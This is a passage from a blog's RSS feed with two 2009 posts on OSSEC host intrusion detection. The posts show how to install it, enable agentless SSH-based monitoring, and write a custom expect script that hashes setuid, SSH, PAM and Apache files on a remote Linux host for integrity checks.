        send_user &amp;quot;\nINFO: Finished.\n&amp;quot;
        exit 0;
    }
}

exit 0;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The comments in the script hints to what is going on, but everything up
to and including &lt;code&gt;set timeout 600&lt;/code&gt; is related to setting up the &lt;code&gt;expect&lt;/code&gt;
functions and code for handling the &lt;code&gt;ssh&lt;/code&gt; subprocess and connecting to
the remote host. I am not going to spend any time with this section, I
am just going to make use of it.&lt;/p&gt;

&lt;p&gt;The meat of what is getting processed on the remote end all happens in
two lines.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;send &amp;quot;echo \&amp;quot;INFO: Starting.\&amp;quot;; for i in `find $args 2&amp;gt;/dev/null`;do tail \$i &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&amp;amp; 
md5=`md5sum \$i | cut -d \&amp;quot; \&amp;quot; -f 1` &amp;amp;&amp;amp; sha1=`sha1sum \$i | cut -d \&amp;quot; \&amp;quot; -f
 1` &amp;amp;&amp;amp; echo FWD: `stat --printf \&amp;quot;%s:%a:%u:%g\&amp;quot; \$i`:\$md5:\$sha1 \$i; done; exit\r&amp;quot;
send &amp;quot;exit\r&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Let&amp;rsquo;s break this down to see what is happening.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;send&lt;/code&gt; command pushes the following string to the ssh subprocess
which gets run on the remote end of the connection. Before the script is
sent to the remote host &lt;code&gt;expect&lt;/code&gt; internally processes the string. This
includes searching for variables and removing any control characters.&lt;/p&gt;

&lt;p&gt;The control characters are first taken into account, and in the case
of our example all escaped special characters are processed. &lt;code&gt;\&amp;quot;&lt;/code&gt;,
&lt;code&gt;\r&lt;/code&gt;, and &lt;code&gt;\$&lt;/code&gt; would be replaced with &lt;code&gt;&amp;quot;&lt;/code&gt;, &amp;ldquo;&lt;code&gt;carriage return&lt;/code&gt;&amp;rdquo;, and &lt;code&gt;&amp;amp;&lt;/code&gt;
respectively. The reason the escape characters are needed so that they
will not interfere with &lt;code&gt;expects&lt;/code&gt; own string processing and control. We
will need to handle control characters in this way when we begin writing
our own script.&lt;/p&gt;

&lt;p&gt;While special characters were being handled by &lt;code&gt;expect&lt;/code&gt; it also
looked for variables to replace, in this case it will find &lt;code&gt;$args&lt;/code&gt;
and replace it with what ever arguments were passed to the script
by the OSSEC agentless process. If we specified the following in
&lt;code&gt;/var/ossec/etc/ossec.conf&lt;/code&gt; the &lt;code&gt;$args&lt;/code&gt; variable would be replaced with
&amp;ldquo;&lt;code&gt;/bin /etc /sbin&lt;/code&gt;&amp;rdquo;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;  &amp;lt;agentless&amp;gt;
    &amp;lt;type&amp;gt;ssh_integrity_check_linux&amp;lt;/type&amp;gt;
    &amp;lt;frequency&amp;gt;3600&amp;lt;/frequency&amp;gt;
    &amp;lt;host&amp;gt;root@172.17.20.20&amp;lt;/host&amp;gt;
    &amp;lt;state&amp;gt;periodic&amp;lt;/state&amp;gt;
    &amp;lt;arguments&amp;gt;/bin /etc /sbin&amp;lt;/arguments&amp;gt;
  &amp;lt;/agentless&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Back to the commands that get run. Once &lt;code&gt;expect&lt;/code&gt; has completed
replacement we are left with this command.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;echo &amp;quot;INFO: Starting.&amp;quot;; for i in `find /bin /etc /sbin 2&amp;gt;/dev/null`;do tail $i &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&amp;amp; 
md5=`md5sum $i | cut -d &amp;quot; &amp;quot; -f 1` &amp;amp;&amp;amp; sha1=`sha1sum $i | cut -d &amp;quot; &amp;quot; -f
 1` &amp;amp;&amp;amp; echo FWD: `stat --printf &amp;quot;%s:%a:%u:%g&amp;quot; $i`:$md5:$sha1 $i; done; exit
exit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This script then goes and uses the Unix &lt;code&gt;find&lt;/code&gt; command to locate all
files in the specified path (from the arguments passed) and generates
an OSSEC &lt;code&gt;FWD:&lt;/code&gt; command for each one and prints it to &lt;code&gt;stdout&lt;/code&gt;. Making
use of the commands &lt;code&gt;stat&lt;/code&gt;, &lt;code&gt;md5sum&lt;/code&gt;, and &lt;code&gt;sha1sum&lt;/code&gt; to generate the data
needed. Here is an example of the output checking.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;spawn ssh root@172.17.20.20
Last login: Wed Nov  4 11:32:51 2009 from 172.17.20.131^M
[linux26 ~]# 
INFO: Started.
echo &amp;quot;INFO: Starting.&amp;quot;; for i in `find {/bin /etc /sbin} 2&amp;gt;/dev/null`;do tail $i &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&amp;amp; 
md5=`md5sum $i | cut -d &amp;quot; &amp;quot; -f 1` &amp;amp;&amp;amp; sha1=`sh a1sum $i | cut -d &amp;quot; &amp;quot; -f
 1` &amp;amp;&amp;amp; echo FWD: `stat --printf &amp;quot;%s:%a:%u:%g&amp;quot; $i`:$md5:$sha1 $i; done; exit
INFO: Starting.
FWD: 833:644:0:0:4148adea745af5121963f6b731b60013:60877a6f6981b16c0d53d32bcd3f07d41cfb5bd4 /etc/modprobe.d/
glib2.sh
[...........SNIP............]
FWD: 1696:644:0:0:c2bd306b205ad9e81fb02ce6b225d384:5244d65815cb228a4fac7bc4c1c7774508fb7505 /etc/nsswitch.conf
FWD: 85179:644:0:0:8db574225cd1068b47e77ceccd96f8ff:b5ef6183b35ee9d1b66ed2cefe98003c5bd99192 /etc/sensors.conf
FWD: 49:644:0:0:52c3df2f1edf30ca3db82174be3a68d2:1934648f2429b70b1f729d343a6956fb0ea73136 /etc/php.d/imap.ini
FWD: 873:644:0:0:04559d1fe27ecd079b69df8b319f937e:e5cab1bf1f9e4bc4386309f4e00a9b7be3e543a2 /etc/php.d/memcache.ini
FWD: 59:644:0:0:94636ba6c4bac9d8d49d9de1a513ae0c:41d5164a2c6e332e40edf55c59a2d0df8a260964 /etc/php.d/pdo_mysql.ini
FWD: 49:644:0:0:917dbbafbfaaa20f660063d627123dae:0e829d4ffc69f58dc258510b4b8452412e31ccc5 /etc/php.d/json.ini
FWD: 0:644:0:0:d41d8cd98f00b204e9800998ecf8427e:da39a3ee5e6b4b0d3255bfef95601890afd80709 /etc/wvdial.conf
logout
Connection to 172.17.20.20 closed.

INFO: Finished.
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;ssh_dmz_linux:7ec6254becbb3beb032261b324a91668&#34;&gt;Our own Agentless Script: ssh_dmz_linux&lt;/h2&gt;

&lt;p&gt;Using the built in OSSEC agentless scripts are great, but sometimes
we need more focused scanning and checking. So let&amp;rsquo;s modify the
&lt;code&gt;ssh_integrity_check_linux&lt;/code&gt; for our environment.&lt;/p&gt;

&lt;p&gt;The goals for this new script will be to watch for changes to files
based on the following criteria:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;All setuid and setgid files&lt;/li&gt;
&lt;li&gt;All files related to authentication (including .htaccess and ssh files)&lt;/li&gt;
&lt;li&gt;All application specific files (apache, ssh)&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;finding_setuid_setgid:7ec6254becbb3beb032261b324a91668&#34;&gt;Finding all setuid and setgid files&lt;/h4&gt;

&lt;p&gt;Let&amp;rsquo;s first start by identifying a method to locate all files with
their setuid or setgid bits enabled. To do this we will ssh to the host
&lt;code&gt;172.17.20.20&lt;/code&gt; and use &lt;code&gt;find&lt;/code&gt; to locate the files.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# sudo -u ossec ssh root@172.17.20.20
[linux26 ~]# find / -type f \( -perm -4000 -o -perm -2000 \) 
/sbin/umount.nfs
/sbin/netreport
/sbin/unix_chkpwd
/sbin/mount.nfs
/sbin/pam_timestamp_check
/sbin/mount.nfs4
/sbin/umount.nfs4
/bin/ping6
/bin/su
/bin/umount
/bin/ping
/bin/mount
/lib/dbus-1/dbus-daemon-launch-helper
/usr/libexec/openssh/ssh-keysign
/usr/libexec/utempter/utempter
/usr/sbin/usernetctl
/usr/sbin/postqueue
/usr/sbin/userhelper
/usr/sbin/userisdnctl
/usr/sbin/postdrop
/usr/sbin/suexec
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/locate
/usr/bin/wall
/usr/bin/sudoedit
/usr/bin/gpasswd
/usr/bin/lockfile
/usr/bin/newgrp
/usr/bin/write
/usr/bin/screen
/usr/bin/passwd
/usr/bin/chage
/usr/bin/sperl5.8.8
/usr/bin/crontab
/usr/bin/ssh-agent
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;finding_app_files:7ec6254becbb3beb032261b324a91668&#34;&gt;Finding all files related to authentication and applications specific files&lt;/h4&gt;

&lt;p&gt;Finding all files with setuid and setgid was simple, but finding all
files related to authentication is more invloved. This of course will
vary from system to system, but this should be good starting point.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# sudo -u ossec ssh root@172.17.20.20
[linux26 ~]# find / \( -name &amp;quot;.ssh&amp;quot; -o -name &amp;quot;ssh&amp;quot; -o -name &amp;quot;sshd&amp;quot; -o -name &amp;quot;httpd&amp;quot; -o -name &amp;quot;.htaccess&amp;quot; 
-o -name &amp;quot;pam.d&amp;quot; \) -exec find {} \;
/var/www/html/admin/modules/framework/var/www/html/admin/modules/.htaccess
/etc/httpd
/etc/httpd/conf
/etc/httpd/conf.d
/etc/httpd/conf.d/php.conf
/etc/httpd/conf.d/proxy_ajp.conf
/etc/httpd/conf.d/README
/etc/httpd/conf.d/ssl.conf
/etc/httpd/conf.d/welcome.conf
/etc/httpd/conf/httpd.conf
/etc/httpd/conf/magic
/etc/httpd/logs
/etc/httpd/modules
/etc/httpd/run
/etc/logrotate.d/httpd
/etc/pam.d
/etc/pam.d/authconfig
[...................SNIP PAM Files.....................]
/etc/pam.d/system-config-network-cmd
/etc/pam.d/vsftpd
/etc/rc.d/init.d/httpd
/etc/rc.d/init.d/sshd
/etc/ssh
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/ssh/ssh_host_dsa_key
/etc/ssh/ssh_host_dsa_key.pub
/etc/ssh/ssh_host_key
/etc/ssh/ssh_host_key.pub
/etc/ssh/ssh_host_rsa_key
/etc/ssh/ssh_host_rsa_key.pub
/etc/sysconfig/httpd
/root/.ssh
/root/.ssh/authorized_keys
/usr/bin/ssh
/usr/lib/httpd
/usr/lib/httpd/modules
/usr/lib/httpd/modules/libphp5.so
[...................SNIP Apache modules................]

/usr/lib/httpd/modules/mod_vhost_alias.so
/usr/sbin/httpd
/usr/sbin/sshd
/usr/src/tbm-pbxconfig-5.5.1/amp_conf/htdocs/admin/modules/framework/htdocs/admin/modules/.htaccess
/usr/src/tbm-pbxconfig-5.5.1/amp_conf/htdocs/admin/modules/.htaccess
/var/empty/sshd
/var/empty/sshd/etc
/var/empty/sshd/etc/localtime
/var/www/html/admin/modules/framework/var/www/html/admin/modules/.htaccess
/var/www/html/admin/modules/.htaccess
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;merging_finds:7ec6254becbb3beb032261b324a91668&#34;&gt;Merging finds&lt;/h4&gt;

&lt;p&gt;Now we have two basic &lt;code&gt;find&lt;/code&gt; methods that identify the files we want to
monitor for changes, but our finds were a little greedy so we should
create a way to strip out unwanted files from the list. As this is a
unix system &lt;code&gt;egrep&lt;/code&gt; is the king for finding or removing items from a
list. To simplify things we can use &lt;code&gt;egrep&lt;/code&gt; with the &lt;code&gt;-v&lt;/code&gt; command line
argument which tells &lt;code&gt;egrep&lt;/code&gt; &lt;strong&gt;NOT&lt;/strong&gt; to print any matching items.&lt;/p&gt;

&lt;p&gt;Just to make sure that we do not end up double processing files we
can make use of the &lt;code&gt;sort&lt;/code&gt; command with &lt;code&gt;-u&lt;/code&gt; argument to remove any
duplicates.&lt;/p&gt;

&lt;p&gt;Here is how we would put together both &lt;code&gt;find&lt;/code&gt;s, &lt;code&gt;egrep&lt;/code&gt;, and &lt;code&gt;sort&lt;/code&gt; to
locate and filter what is needed.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;(find / -type f \( -perm -4000 -o -perm -2000 \) &amp;amp;&amp;amp; \find / \( -name &amp;quot;.ssh&amp;quot; -o -name &amp;quot;ssh&amp;quot; -o -name &amp;quot;sshd&amp;quot; 
-o -name &amp;quot;httpd&amp;quot; -o -name &amp;quot;.htaccess&amp;quot; -o -name &amp;quot;pam.d&amp;quot; \) -exec find {} \; ) 2&amp;gt;/dev/null | egrep 
-v &amp;quot;known_hosts|moduli|var\/log|var\/lock&amp;quot; | sort -u
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The above command we have found all files and paths that we would like
to monitor, but this still needs to be integrated into a script on the
OSSEC server.&lt;/p&gt;

&lt;h2 id=&#34;creating_ssh_dmz_linux:7ec6254becbb3beb032261b324a91668&#34;&gt;Creating ssh_dmz_linux&lt;/h2&gt;

&lt;p&gt;We don&amp;rsquo;t want to make changes to &lt;code&gt;ssh_integrity_check_linux&lt;/code&gt; directly so
we will need to make a copy.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# (cd /var/ossec/agentless &amp;amp;&amp;amp; cp ssh_integrity_check_linux ssh_dmz_linux)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Integrating our new command line into the script we must pay close
attention to special characters that &lt;code&gt;expect&lt;/code&gt; will process. Due to this
we will need to escape all &lt;code&gt;/&lt;/code&gt; and &lt;code&gt;&amp;quot;&lt;/code&gt; by proceeding them with &lt;code&gt;\&lt;/code&gt;. Once
we are done escaping we just insert our new line in place of &lt;code&gt;find $args
2&amp;gt;/dev/null&lt;/code&gt; in our new file.&lt;/p&gt;

&lt;p&gt;Here is what the completed script will look like.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-expect&#34;&gt;obsd56# cat /var/ossec/agentless/ssh_dmz_linux
 #!/usr/bin/env expect

 # @(#) $Id: ssh_integrity_check_linux,v 1.11 2009/06/24 17:06:21 dcid Exp $
 # Agentless monitoring
 #
 # Copyright (C) 2009 Trend Micro Inc.
 # All rights reserved.
 # 
 # This program is a free software; you can redistribute it
 # and/or modify it under the terms of the GNU General Public
 # License (version 3) as published by the FSF - Free Software
 # Foundation.


 # Main script.
source &amp;quot;agentless/main.exp&amp;quot;


 # SSHing to the box and passing the directories to check.
if [catch {
    spawn ssh $hostname
} loc_error] {
    send_user &amp;quot;ERROR: Opening connection: $loc_error.\n&amp;quot;
    exit 1;
}


source $sshsrc
source $susrc

set timeout 600
send &amp;quot;echo \&amp;quot;INFO: Starting.\&amp;quot;; for i in `(find / \\( -name \&amp;quot;.ssh\&amp;quot; -o -name \&amp;quot;ssh\&amp;quot; -o -name \&amp;quot;sshd\&amp;quot; 
-o -name \&amp;quot;httpd\&amp;quot; -o -name \&amp;quot;.htaccess\&amp;quot; -o -name \&amp;quot;pam.d\&amp;quot; \\) -exec find {} \\; &amp;amp;&amp;amp; find / -type f 
\\( -perm -4000 -o -perm -2000 \\); ) 2&amp;gt;/dev/null | egrep -v \&amp;quot;known_hosts|moduli|var\\/log|var\\/lock\&amp;quot; | sort -u`;
do tail \$i &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&amp;amp; md5=`md5sum \$i | cut -d \&amp;quot; \&amp;quot; -f 1` &amp;amp;&amp;amp; sha1=`sha1sum \$i | cut -d \&amp;quot; \&amp;quot; 
-f 1` &amp;amp;&amp;amp; echo FWD: `stat --printf \&amp;quot;%s:%a:%u:%g\&amp;quot; \$i`:\$md5:\$sha1 \$i; done; exit\r&amp;quot;
send &amp;quot;exit\r&amp;quot;

expect {
    timeout {
        send_user &amp;quot;ERROR: Timeout while running commands on host: $hostname .\n&amp;quot;
        exit 1;
    }
    eof {
        send_user &amp;quot;\nINFO: Finished.\n&amp;quot;
        exit 0;
    }
}

exit 0;
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;testing_ssh_dmz_linux:7ec6254becbb3beb032261b324a91668&#34;&gt;Testing&lt;/h4&gt;

&lt;p&gt;Before we add this new script to OSSEC configuration we need to test it.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# (cd /var/ossec &amp;amp;&amp;amp; sudo -u ossec ./agentless/ssh_dmz_linux root@172.17.20.20 )

ERROR: ssh_integrity_check &amp;lt;hostname&amp;gt; &amp;lt;arguments&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Due to not making use of the of the &lt;code&gt;$arg&lt;/code&gt; variable in the way that
&lt;code&gt;ssh_integrity_check_linux&lt;/code&gt; wants use too, this caused this the problem
above. Solving this problem would require making changes to files that
will effect other built in scripts. So a quick solution is to just pass
anything as an argument to the script. This will have no effect on our
script as we do not make use of the &lt;code&gt;$arg&lt;/code&gt; variable.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# (cd /var/ossec &amp;amp;&amp;amp; sudo -u ossec ./agentless/ssh_dmz_linux root@172.17.20.20 NOTUSED)
spawn ssh root@172.17.20.20
Last login: Wed Nov  4 13:46:32 2009 from 172.17.20.131^M
[linux26 ~]#  
INFO: Started.
echo &amp;quot;INFO: Starting.&amp;quot;; for i in `(find / \( -name &amp;quot;.ssh&amp;quot; -o -name &amp;quot;ssh&amp;quot; -o -name &amp;quot;sshd&amp;quot; -o -name &amp;quot;httpd&amp;quot; 
-o -name &amp;quot;.htaccess&amp;quot; -o -name &amp;quot;pam.d&amp;quot; \)  -exec find {} \; &amp;amp;&amp;amp; find / -type f \( -perm -4000 -o -perm -2000 
\); ) 2&amp;gt;/dev/null | egrep -v &amp;quot;known_hosts|moduli|var\/log|var\/lock&amp;quot;`;do tail $i &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&amp;amp;
 md5=`md5s ^Mum $i | cut -d &amp;quot; &amp;quot; -f 1` &amp;amp;&amp;amp; sha1=`sha1sum $i | cut -d &amp;quot; &amp;quot; -f 1` &amp;amp;&amp;amp; echo FWD: `stat --printf 
&amp;quot;%s:%a:%u:%g&amp;quot; $i`:$md5:$sha1 $i; done; exit
INFO: Starting.
FWD: 14:775:100:101:3bc0a3e92f8170084dd102eda9a474b1:25a1783a3c6bdd9745ec245ec1bfa0414ee05d23 /var/www/html/admin/modules/.htaccessmodules/.htaccess
FWD: 3519:644:0:0:e4ca381035a34b7a852184cc0dd89baa:6e43d0b5a46ed5ba78da5c7e9dcf319b27d769e7 /var/empty/sshd/etc/localtime
FWD: 560:644:0:0:58370830ecfa056421ad21aff9c18905:d115bb5aeefaab97c53fbbd5df84ebcb9170d796 /etc/httpd/conf.d/php.conf
[...................SNIP.............................]
FWD: 392:644:0:0:e92bea7e9d70a9ecdc61edd7c0a2f59a:d77b61dac010c60589b4d8a2039e3b8a5bed18b2 /etc/httpd/conf.d/README
FWD: 70888:4711:0:0:9046bd13339e7ef22266067b633e601a:3fc41029ddb14fe4ed613f479fa9e89c944f04dd /usr/bin/sperl5.8.8
FWD: 315416:6755:0:0:4c63a9709fb7f0f97c30aa29d204859c:c379efa658de72866b8f6de5767906ff78d127b0 /usr/bin/crontab
FWD: 88964:2755:0:99:baf3ebef6377d6ef42858776c33621b0:62394bf57d18c3fd49adeb39a1da61661cabc3c8 /usr/bin/ssh-agent
logout
Connection to 172.17.20.20 closed.

INFO: Finished.

&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;going_live:7ec6254becbb3beb032261b324a91668&#34;&gt;Going live&lt;/h4&gt;

&lt;p&gt;We have created a new OSSEC agentless script
and I am going to enable this script using the
&lt;a href=&#34;http://bitbucket.org/jrossi/ossec-hids-tools/&#34;&gt;ossec-hids-tools&lt;/a&gt; that
I introduced in my last post about ossec
(&lt;a href=&#34;https://jeremyrossi.com/archives/2009/11/ossec-agentless-to-save-the-day/&#34;&gt;OSSEC: Agentless to save the day&lt;/a&gt;). Also a
restart of OSSEC will also be needed for the changes to take effect.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# ossec-config --section agentless --add --host root@172.17.20.20 --type ssh_dmz_linux 
--state periodic --argv &amp;quot;NOTUSED&amp;quot;
obsd46# /var/ossec/bin/ossec-control restart                                                   (root@jcli-1:/var/ossec)
Killing ossec-monitord .. 
Killing ossec-logcollector .. 
Killing ossec-remoted .. 
Killing ossec-syscheckd .. 
Killing ossec-analysisd .. 
Killing ossec-maild .. 
ossec-execd not running ..
Killing ossec-agentlessd .. 
OSSEC HIDS v2.2 Stopped
Starting OSSEC HIDS v2.2 (by Trend Micro Inc.)...
Started ossec-agentlessd...
Started ossec-maild...
Started ossec-execd...
Started ossec-analysisd...
Started ossec-logcollector...
Started ossec-remoted...
Started ossec-syscheckd...
Started ossec-monitord...
Completed.
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Ossec: Agentless to save the day</title>
      <link>https://jeremyrossi.com/blog/2009/10/02/ossec-agentless-to-save-the-day/</link>
      <pubDate>Fri, 02 Oct 2009 00:00:00 +0000</pubDate>
      
      <guid>https://jeremyrossi.com/blog/2009/10/02/ossec-agentless-to-save-the-day/</guid>
      <description>

&lt;blockquote&gt;
&lt;p&gt;Lois, Clark Kent may seem like just a mild-mannered reporter, but
listen, not only does he know how to treat his editor-in-chief with the
proper respect, not only does he have a snappy, punchy prose style, but
he is, in my forty years in this business, the fastest typist I&amp;rsquo;ve ever
seen.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;Perry White&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Michael Starks from &lt;a href=&#34;http://www.immutablesecurity.com/&#34;&gt;Immutable Security&lt;/a&gt; published the &amp;ldquo;Week of
OSSEC&amp;rdquo; all last week (find their links at the end of article), and it
was a great setup of posts.&lt;/p&gt;

&lt;p&gt;With all the hard work done by Michael in his &amp;ldquo;Week of OSSEC&amp;rdquo;, I figured
I should follow up with a few posts of my own about this great tool.
I am &lt;strong&gt;NOT&lt;/strong&gt; going to do a week of posts, but will try to get as much
information out as I can.&lt;/p&gt;

&lt;h3 id=&#34;ossec:22d710b97ad10f77ccd625d0dc30cfb4&#34;&gt;OSSEC&lt;/h3&gt;

&lt;p&gt;&lt;img src=&#34;http://praetorianprefect.com/wp-content/uploads/2009/11/Screen-shot-2009-11-02-at-8.06.14-PM.png&#34; border=&#34;0&#34; alt=&#34;Screen shot 2009-11-02 at 8.06.14 PM.png&#34; width=&#34;66&#34; height=&#34;64&#34; /&gt;&lt;/p&gt;

&lt;p&gt;OSSEC is a Host Intrusion Detection System (HIDS) in name, but in
reality it is far more. It&amp;rsquo;s able to look for rootkits, monitor logs
(LIDS), and even actively respond to defined events. While all these
features are great, the unsung hero is agentless monitoring.&lt;/p&gt;

&lt;p&gt;Agentless security monitoring is really a great feature that does not
get explored often enough, so I am going to show how to get it up and
running and then get it monitoring remote hosts.&lt;/p&gt;

&lt;h3 id=&#34;ossec-install:22d710b97ad10f77ccd625d0dc30cfb4&#34;&gt;Installing OSSEC&lt;/h3&gt;

&lt;p&gt;This is going to be one of the fastest OSSEC install
instructions on the internet. For full details the main
&lt;a href=&#34;http://www.ossec.net/main/documentation/&#34;&gt;OSSEC website&lt;/a&gt; which covers this
topic with more detail. Key things to note here is that I have installed
it as a server. I could have installed OSSEC locally and we would have
still been able to do whatever was needed.&lt;/p&gt;

&lt;p&gt;My install log for OSSEC 2.2 is &lt;a title=&#34;install-ossec-v2.2.txt&#34; href=&#34;http://praetorianprefect.com/wp-content/uploads/2009/10/install-ossec-v2.2.txt&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&#34;agentless-enable:22d710b97ad10f77ccd625d0dc30cfb4&#34;&gt;Enabling agentless&lt;/h3&gt;

&lt;p&gt;To make use of agentless security monitoring, it first
needs to be enabled. Full details also on the
&lt;a href=&#34;http://www.ossec.net/main/manual/manual-agentless-monitoring/&#34;&gt;OSSEC webpage&lt;/a&gt;.&lt;/p&gt;

&lt;h4 id=&#34;agentless-requirements:22d710b97ad10f77ccd625d0dc30cfb4&#34;&gt;Agentless Requirements&lt;/h4&gt;

&lt;p&gt;For most of the built-in agentless monitoring scripts, &lt;code&gt;expect&lt;/code&gt; is
needed to function. In this example on OpenBSD 4.5, adding the &lt;code&gt;expect&lt;/code&gt;
package is simple with &lt;code&gt;pkg_add&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# pkg_add http://openbsd.mirror.frontiernet.net/pub/OpenBSD/4.5/packages/i386/expect-5.43.0p0-no_tk.tgz
tcl-8.4.19: complete
expect-5.43.0p0-no_tk: complete
--- tcl-8.4.19 -------------------
You may wish to add /usr/local/lib/tcl8.4/man to /etc/man.conf
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;turning-on-agentless:22d710b97ad10f77ccd625d0dc30cfb4&#34;&gt;Turning on Agentless&lt;/h4&gt;

&lt;p&gt;Now we need to enable agentless by running the following command:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# /var/ossec/bin/ossec-control enable agentless
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;adding-a-host:22d710b97ad10f77ccd625d0dc30cfb4&#34;&gt;Adding a host.&lt;/h4&gt;

&lt;p&gt;We need to add a host to agentlessly monitor. If we were to authenticate
using a password for host &lt;code&gt;172.17.20.20&lt;/code&gt; we would use the following:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# /var/ossec/agentless/register_host.sh add agentless@172.17.20.20
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;While using a password does work, the preferred method would be to use
SSH keys to provide the access level needed. To setup that method of
access, you first need to create ssh keys for the user &lt;code&gt;ossec&lt;/code&gt; which is
the account the agentless scripts runs as.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# sudo -u ossec ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/var/ossec/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /var/ossec/.ssh/id_rsa.
Your public key has been saved in /var/ossec/.ssh/id_rsa.pub.
The key fingerprint is:
b8:c3:47:9a:33:09:5c:eb:54:a0:82:39:a6:06:63:08 ossec@obsd45.ptnsecurity.com
The key&#39;s randomart image is:
+--[ RSA 2048]----+
|E     .          |
|oo   . .         |
|Bo. . . .        |
|=o o . +         |
|..  o + S        |
|.    = *         |
|      @ .        |
|       =         |
|                 |
+-----------------+
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now that the SSH keys are present, we can add the host without a
password. The special command line argument used with &lt;code&gt;register_host.sh&lt;/code&gt;
is &lt;code&gt;NOPASS&lt;/code&gt; in all capitals, which will tell OSSEC supplied scripts to
make use of SSH keys.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;obsd46# /var/ossec/agentless/register_host.sh add root@172.17.20.20 NOPASS
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;enabling-ssh-key-on-the-host-to-be-monitored:22d710b97ad10f77ccd625d0dc30cfb4&#34;&gt;Enabling SSH key on the host to be monitored.&lt;/h4&gt;

&lt;p&gt;You will now need to securely get the contents of
&lt;code&gt;/var/ossec/.ssh/id_rsa.pub&lt;/code&gt; to 172.17.20.20.&lt;/p&gt;

&lt;p&gt;Using SSH and the password for a single time will make this simple. This
will create the &lt;code&gt;/root/.ssh&lt;/code&gt; if it is not already created, but might
throw an error as it does if the directory is already present. This is
not a problem and can be ignored.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# cat /var/ossec/.ssh/id_rsa.pub | ssh root@172.17.20.20 &amp;quot;( mkdir /root/.ssh/;  cat - &amp;gt;&amp;gt; /root/.ssh/authorized_keys )&amp;quot;
root@172.17.20.20&#39;s password:
mkdir: cannot create directory `/root/.ssh/&#39;: File exists
obsd46# ssh root@172.17.20.20 &amp;quot;cat  /root/.ssh/authorized_keys &amp;quot;
root@172.17.20.20&#39;s password:
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAzyTBo7CqkI0TISR9S+KPS/gYY60nkD7Qe8wTTXrAEFvPNFJ
NJJpVVKsij6zw86lvTZ6hx9ib1M+MXvt+70uF/z1hYwnYrczR2TR03Z5nwOUA9OK61nBWXVwCi9GsQs6Oeo
mY9vkBDoKzB52+TKKSk9ZoC+HYPiT5SaiHZvMOV7kWuwF67lnYwlG5FdkRdOiXp7DcRjje4/Hixg7RLLl7o
dEXpIakzGfalt3yQDmwvSUZhyg3OuoKimTeNiKU/jlHlmEPuDZpiQe6QhFH38EeEIZTdHsYITodl8sY+n9I
eNMalGIHPs+bph+qcK+6cOb1RGaeGqJBFjaqPUyismz0bw== ossec@obsd45.ptnsecurity.com
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We can also verify that it worked with the following command.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;obsd46# sudo -u ossec ssh root@172.17.20.20
The authenticity of host &#39;172.17.20.20 (172.17.20.20)&#39; can&#39;t be established.
